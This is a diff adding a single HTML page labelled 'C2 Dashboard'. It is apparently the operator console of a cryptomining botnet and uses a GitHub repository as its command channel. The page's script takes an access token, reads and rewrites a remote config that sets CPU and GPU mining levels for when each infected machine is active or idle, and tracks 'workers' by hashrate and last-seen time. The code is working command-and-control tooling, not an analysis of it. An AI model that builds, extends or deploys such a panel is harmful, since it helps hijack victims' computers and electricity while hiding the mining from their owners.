@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel</title>
+<style>
+body { margin: 0; padding: 0; background-color: #000; color: #fff; font-family: monospace; }
+#stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+.container { max-width: 800px; margin: 0 auto; padding: 20px; z-index: 10; position: relative; }
+h1, h2, h3 { color: #fff; border-bottom: 1px solid #fff; padding-bottom: 5px; }
+table { width: 100%; border-collapse: collapse; margin-top: 20px; background-color: rgba(0,0,0,0.8); }
+th, td { border: 1px solid #fff; padding: 8px; text-align: left; }
+.btn { background-color: #fff; color: #000; border: none; padding: 5px 15px; cursor: pointer; font-family: monospace; font-weight: bold; margin-top: 10px; }
+.btn:hover { background-color: #ccc; }
+.input { padding: 5px; font-family: monospace; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
+.box { background-color: rgba(0,0,0,0.8); border: 1px solid #fff; padding: 15px; margin-bottom: 20px; }
+.green { color: #0f0; }
+.red { color: #f00; }
+#login { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; z-index: 50; }
+.login-inner { border: 1px solid #fff; padding: 20px; text-align: center; background: #000; }
+</style>
+</head>
+<body>
+
+<canvas id="stars"></canvas>
+
+<div id="login">
+    <div class="login-inner">
+        <h2>Enter PAT</h2>
+        <input type="password" id="tokenIn" class="input">
+        <button class="btn" onclick="doLogin()">Login</button>
+    </div>
+</div>
+
+<div class="container" id="dash" style="display:none">
+    <h1>C2 Dashboard</h1>
+    
+    <div class="box">
+        <h3>Network Status</h3>
+        <p>Total Hashrate: <span id="totHash">0</span> H/s</p>
+        <p>Active Workers: <span id="activeNodes">0</span></p>
+        <button class="btn" onclick="fetchData()">Refresh</button>
+    </div>
+
+    <div class="box">
+        <h3>Configuration</h3>
+        <p>CPU Active: <span id="ca_val"></span> <input type="range" id="cfg_ca" min="0" max="100" oninput="document.getElementById('ca_val').innerText=this.value+'%'"></p>
+        <p>CPU Idle: <span id="ci_val"></span> <input type="range" id="cfg_ci" min="0" max="100" oninput="document.getElementById('ci_val').innerText=this.value+'%'"></p>
+        <p>GPU Active: <span id="ga_val"></span> <input type="range" id="cfg_ga" min="0" max="100" oninput="document.getElementById('ga_val').innerText=this.value+'%'"></p>
+        <p>GPU Idle: <span id="gi_val"></span> <input type="range" id="cfg_gi" min="0" max="100" oninput="document.getElementById('gi_val').innerText=this.value+'%'"></p>
+        <button class="btn" onclick="saveConfig()">Save Settings</button>
+    </div>
+
+    <div class="box">
+        <h3>Workers</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Status</th>
+                    <th>Name</th>
+                    <th>CPU</th>
+                    <th>Hashrate</th>
+                    <th>Last Seen</th>
+                </tr>
+            </thead>
+            <tbody id="workerTable">
+                <tr><td colspan="5" style="text-align:center;">Waiting...</td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<script>
+// Stars logic
+const canvas = document.getElementById('stars');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+const numStars = 200;
+const stars = [];
+for(let i=0; i<numStars; i++) stars.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, z: Math.random()*canvas.width });
+function drawStars() {
+    ctx.fillStyle = '#000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#fff';
+    for(let s of stars) {
+        s.z -= 2;
+        if(s.z <= 0) { s.z = canvas.width; s.x = Math.random()*canvas.width; s.y = Math.random()*canvas.height; }
+        const k = 128.0 / s.z;
+        const px = (s.x - canvas.width/2) * k + canvas.width/2;
+        const py = (s.y - canvas.height/2) * k + canvas.height/2;
+        const size = (1 - s.z/canvas.width) * 3;
+        ctx.beginPath(); ctx.arc(px, py, size, 0, Math.PI*2); ctx.fill();
+    }
+    requestAnimationFrame(drawStars);
+}
+drawStars();
+
+const REPO = 'HolyV200/test-repo';
+let PAT = '';
+let currentConfig = {};
+let configSha = '';
+
+function doLogin() {
+    PAT = document.getElementById('tokenIn').value.trim();
+    if(PAT) {
+        document.getElementById('login').style.display = 'none';
+        document.getElementById('dash').style.display = 'block';
+        fetchData();
+        setInterval(fetchData, 30000);
+    }
+}
+
+async function fetchData() {
+    await fetchConfig();
+    await fetchWorkers();
+}
+
+async function fetchConfig() {
+    try {
+        const r = await fetch('https://api.github.com/repos/'+REPO+'/contents/config.json', {
+            headers: {'Authorization': 'token '+PAT, 'Accept': 'application/vnd.github.v3.raw'}
+        });
+        if(r.ok) {
+            currentConfig = await r.json();
+            document.getElementById('cfg_ca').value = currentConfig.cpu_active || 10;
+            document.getElementById('ca_val').innerText = (currentConfig.cpu_active || 10) + '%';
+            document.getElementById('cfg_ci').value = currentConfig.cpu_idle || 35;
+            document.getElementById('ci_val').innerText = (currentConfig.cpu_idle || 35) + '%';
+            document.getElementById('cfg_ga').value = currentConfig.gpu_active || 0;
+            document.getElementById('ga_val').innerText = (currentConfig.gpu_active || 0) + '%';
+            document.getElementById('cfg_gi').value = currentConfig.gpu_idle || 85;
+            document.getElementById('gi_val').innerText = (currentConfig.gpu_idle || 85) + '%';
+        }
+        
+        const rMeta = await fetch('https://api.github.com/repos/'+REPO+'/contents/config.json', {
+            headers: {'Authorization': 'token '+PAT}
+        });
+        if(rMeta.ok) { configSha = (await rMeta.json()).sha; }
+    } catch(e) { }
+}
+
+async function saveConfig() {
+    if(!configSha) return;
+    currentConfig.cpu_active = parseInt(document.getElementById('cfg_ca').value);
+    currentConfig.cpu_idle = parseInt(document.getElementById('cfg_ci').value);
+    currentConfig.gpu_active = parseInt(document.getElementById('cfg_ga').value);
+    currentConfig.gpu_idle = parseInt(document.getElementById('cfg_gi').value);
+    
+    try {
+        await fetch('https://api.github.com/repos/'+REPO+'/contents/config.json', {
+            method: 'PUT',
+            headers: {'Authorization': 'token '+PAT, 'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                message: "Update Config",
+                content: btoa(JSON.stringify(currentConfig, null, 2)),
+                sha: configSha
+            })
+        });
+        alert('Saved!');
+    } catch(e) { alert('Failed'); }
+}
+
+async function fetchWorkers() {
+    try {
+        const r = await fetch('https://api.github.com/repos/'+REPO+'/contents/status', {
+            headers: {'Authorization': 'token '+PAT}
+        });
+        if(!r.ok) return;
+        const files = await r.json();
+        
+        let html = '';
+        let totHash = 0;
+        let active = 0;
+        
+        for(let f of files) {
+            if(f.name.endsWith('.json')) {
+                try {
+                    const r2 = await fetch(f.download_url);
+                    const st = await r2.json();
+                    const age = (Date.now() - new Date(st.ts).getTime()) / 1000;
+                    const isOnline = age < 600;
+                    
+                    if(isOnline) { active++; totHash += st.hashrate || 0; }
+                    
+                    html += `<tr>
+                        <td class="${isOnline ? 'green' : 'red'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</td>
+                        <td>${f.name.replace('.json','')}</td>
+                        <td>${st.cpu || 'Unknown'}</td>
+                        <td>${(st.hashrate||0).toFixed(1)}</td>
+                        <td>${Math.round(age/60)}m ago</td>
+                    </tr>`;
+                } catch(e) {}
+            }
+        }
+        
+        document.getElementById('workerTable').innerHTML = html || '<tr><td colspan="5">No nodes</td></tr>';
+        document.getElementById('totHash').innerText = totHash.toFixed(1);
+        document.getElementById('activeNodes').innerText = active;
+    } catch(e) { }
+}
+</script>
+</body>
+</html>
